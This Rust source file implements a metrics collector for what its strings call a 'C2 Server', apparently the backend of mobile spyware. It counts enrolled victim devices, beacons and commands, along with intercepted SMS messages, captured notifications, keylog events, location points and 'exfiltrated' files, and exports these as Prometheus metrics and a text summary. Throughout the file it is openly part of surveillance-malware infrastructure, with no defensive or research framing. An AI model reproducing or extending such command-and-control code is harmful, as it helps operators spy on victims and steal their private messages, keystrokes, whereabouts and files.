use parking_lot::RwLock;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

pub struct MetricsCollector {
    // Connection metrics
    total_devices: Arc<AtomicU64>,
    active_connections: Arc<AtomicU64>,
    failed_enrollments: Arc<AtomicU64>,

    // Message metrics
    beacons_received: Arc<AtomicU64>,
    commands_sent: Arc<AtomicU64>,
    commands_acked: Arc<AtomicU64>,
    commands_failed: Arc<AtomicU64>,

    // Data metrics
    sms_received: Arc<AtomicU64>,
    notifications_received: Arc<AtomicU64>,
    keylogs_received: Arc<AtomicU64>,
    locations_received: Arc<AtomicU64>,
    files_received: Arc<AtomicU64>,
    bytes_received: Arc<AtomicU64>,

    // Performance
    avg_response_time_ms: Arc<RwLock<f64>>,
    peak_concurrent_devices: Arc<AtomicU64>,
}

impl MetricsCollector {
    pub fn new() -> Self {
        Self {
            total_devices: Arc::new(AtomicU64::new(0)),
            active_connections: Arc::new(AtomicU64::new(0)),
            failed_enrollments: Arc::new(AtomicU64::new(0)),
            beacons_received: Arc::new(AtomicU64::new(0)),
            commands_sent: Arc::new(AtomicU64::new(0)),
            commands_acked: Arc::new(AtomicU64::new(0)),
            commands_failed: Arc::new(AtomicU64::new(0)),
            sms_received: Arc::new(AtomicU64::new(0)),
            notifications_received: Arc::new(AtomicU64::new(0)),
            keylogs_received: Arc::new(AtomicU64::new(0)),
            locations_received: Arc::new(AtomicU64::new(0)),
            files_received: Arc::new(AtomicU64::new(0)),
            bytes_received: Arc::new(AtomicU64::new(0)),
            avg_response_time_ms: Arc::new(RwLock::new(0.0)),
            peak_concurrent_devices: Arc::new(AtomicU64::new(0)),
        }
    }

    pub fn record_device_enrolled(&self) {
        self.total_devices.fetch_add(1, Ordering::SeqCst);
        self.active_connections.fetch_add(1, Ordering::SeqCst);
        
        // Update peak
        let current = self.active_connections.load(Ordering::SeqCst);
        let peak = self.peak_concurrent_devices.load(Ordering::SeqCst);
        if current > peak {
            self.peak_concurrent_devices.store(current, Ordering::SeqCst);
        }
    }

    pub fn record_device_disconnected(&self) {
        self.active_connections.fetch_sub(1, Ordering::SeqCst);
    }

    pub fn record_enrollment_failed(&self) {
        self.failed_enrollments.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_beacon_received(&self) {
        self.beacons_received.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_command_sent(&self) {
        self.commands_sent.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_command_acked(&self) {
        self.commands_acked.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_command_failed(&self) {
        self.commands_failed.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_sms_received(&self) {
        self.sms_received.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_notification_received(&self) {
        self.notifications_received.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_keylog_received(&self) {
        self.keylogs_received.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_location_received(&self) {
        self.locations_received.fetch_add(1, Ordering::SeqCst);
    }

    pub fn record_file_received(&self, size_bytes: u64) {
        self.files_received.fetch_add(1, Ordering::SeqCst);
        self.bytes_received.fetch_add(size_bytes, Ordering::SeqCst);
    }

    pub fn record_response_time(&self, ms: f64) {
        let mut avg = self.avg_response_time_ms.write();
        // Simple exponential moving average
        *avg = (*avg * 0.9) + (ms * 0.1);
    }

    pub fn export_prometheus(&self) -> String {
        let mut output = String::new();

        // Device metrics
        output.push_str("# HELP c2_total_devices Total devices enrolled\n");
        output.push_str("# TYPE c2_total_devices gauge\n");
        output.push_str(&format!("c2_total_devices {}\n", self.total_devices.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_active_connections Currently active device connections\n");
        output.push_str("# TYPE c2_active_connections gauge\n");
        output.push_str(&format!("c2_active_connections {}\n", self.active_connections.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_peak_concurrent_devices Peak concurrent devices\n");
        output.push_str("# TYPE c2_peak_concurrent_devices gauge\n");
        output.push_str(&format!("c2_peak_concurrent_devices {}\n", self.peak_concurrent_devices.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_failed_enrollments Failed enrollment attempts\n");
        output.push_str("# TYPE c2_failed_enrollments counter\n");
        output.push_str(&format!("c2_failed_enrollments {}\n", self.failed_enrollments.load(Ordering::SeqCst)));

        // Message metrics
        output.push_str("# HELP c2_beacons_received Beacons/heartbeats received\n");
        output.push_str("# TYPE c2_beacons_received counter\n");
        output.push_str(&format!("c2_beacons_received {}\n", self.beacons_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_commands_sent Commands sent to devices\n");
        output.push_str("# TYPE c2_commands_sent counter\n");
        output.push_str(&format!("c2_commands_sent {}\n", self.commands_sent.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_commands_acked Commands acknowledged by devices\n");
        output.push_str("# TYPE c2_commands_acked counter\n");
        output.push_str(&format!("c2_commands_acked {}\n", self.commands_acked.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_commands_failed Commands failed on devices\n");
        output.push_str("# TYPE c2_commands_failed counter\n");
        output.push_str(&format!("c2_commands_failed {}\n", self.commands_failed.load(Ordering::SeqCst)));

        // Data metrics
        output.push_str("# HELP c2_sms_received SMS messages intercepted\n");
        output.push_str("# TYPE c2_sms_received counter\n");
        output.push_str(&format!("c2_sms_received {}\n", self.sms_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_notifications_received Notifications captured\n");
        output.push_str("# TYPE c2_notifications_received counter\n");
        output.push_str(&format!("c2_notifications_received {}\n", self.notifications_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_keylogs_received Keylog events\n");
        output.push_str("# TYPE c2_keylogs_received counter\n");
        output.push_str(&format!("c2_keylogs_received {}\n", self.keylogs_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_locations_received Location data points\n");
        output.push_str("# TYPE c2_locations_received counter\n");
        output.push_str(&format!("c2_locations_received {}\n", self.locations_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_files_received Files exfiltrated\n");
        output.push_str("# TYPE c2_files_received counter\n");
        output.push_str(&format!("c2_files_received {}\n", self.files_received.load(Ordering::SeqCst)));

        output.push_str("# HELP c2_bytes_received Total bytes received\n");
        output.push_str("# TYPE c2_bytes_received counter\n");
        output.push_str(&format!("c2_bytes_received {}\n", self.bytes_received.load(Ordering::SeqCst)));

        // Performance
        output.push_str("# HELP c2_avg_response_time_ms Average response time\n");
        output.push_str("# TYPE c2_avg_response_time_ms gauge\n");
        output.push_str(&format!("c2_avg_response_time_ms {}\n", *self.avg_response_time_ms.read()));

        output
    }

    pub fn summary(&self) -> String {
        format!(
            r#"
=== C2 Server Metrics ===
Total Devices: {}
Active Connections: {}
Peak Concurrent: {}
Failed Enrollments: {}

Beacons Received: {}
Commands Sent: {}
Commands Acked: {}
Commands Failed: {}

SMS Received: {}
Notifications: {}
Keylogs: {}
Locations: {}
Files: {} ({} MB)

Avg Response Time: {:.2}ms
"#,
            self.total_devices.load(Ordering::SeqCst),
            self.active_connections.load(Ordering::SeqCst),
            self.peak_concurrent_devices.load(Ordering::SeqCst),
            self.failed_enrollments.load(Ordering::SeqCst),
            self.beacons_received.load(Ordering::SeqCst),
            self.commands_sent.load(Ordering::SeqCst),
            self.commands_acked.load(Ordering::SeqCst),
            self.commands_failed.load(Ordering::SeqCst),
            self.sms_received.load(Ordering::SeqCst),
            self.notifications_received.load(Ordering::SeqCst),
            self.keylogs_received.load(Ordering::SeqCst),
            self.locations_received.load(Ordering::SeqCst),
            self.files_received.load(Ordering::SeqCst),
            self.bytes_received.load(Ordering::SeqCst) / (1024 * 1024),
            *self.avg_response_time_ms.read(),
        )
    }
}
